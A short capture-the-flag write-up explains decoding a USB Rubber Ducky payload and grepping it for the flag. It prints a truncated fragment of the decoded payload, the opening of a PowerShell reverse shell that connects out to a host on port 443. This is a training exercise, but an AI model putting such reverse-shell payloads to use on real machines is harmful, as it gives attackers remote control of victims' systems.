## Like A Duck In Water (75 Points)

### Problem
```
Hello Agent, We found a flash drive in a safe house belonging to APT403. We have been able to recover the contents of this famous key, which is for you to investigate.

file: inject.bin
```

### Solution
The challenge description gives you a file `inject.bin` and mentions it being the contents of a `famous key`. The only famous flash drive I know is the USB Rubber Ducky, but I don't know how to decode that? But I'm sure there's a website for it.

Sure enough the [Duck Tool Kit](https://ducktoolkit.com/decode) can do it. This gave me an output `duckycode.txt` file.

By running `strings` and `grep`, we get our flag.

```
$ strings duckycode.txt | grep CYBER

... System.Net.Sockets.TCPClient("CYBERTF{D0N4LD_DUC|<}",443);$s ...
```

Flag: `CYBERTF{D0N4LD_DUC|<}`
